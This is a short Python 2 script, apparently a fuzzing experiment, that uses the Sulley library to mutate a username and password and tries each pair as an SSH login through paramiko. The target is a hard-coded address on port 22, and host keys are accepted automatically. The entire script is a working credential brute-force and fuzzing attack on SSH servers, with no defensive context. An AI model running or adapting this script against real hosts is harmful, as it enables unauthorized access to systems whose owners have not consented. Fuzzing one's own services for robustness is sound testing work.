from sulley import *
import sulley.primitives
import paramiko

user = primitives.string("root")
pwd = primitives.string("123456")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

while(user.mutate() and pwd.mutate()):
	username = user.value
	password = pwd.value
	try:
		client.connect("7.7.7.101",22,username,password,timeout=5)
		client.close()
	except Exception,e:
		print "error! %s" % e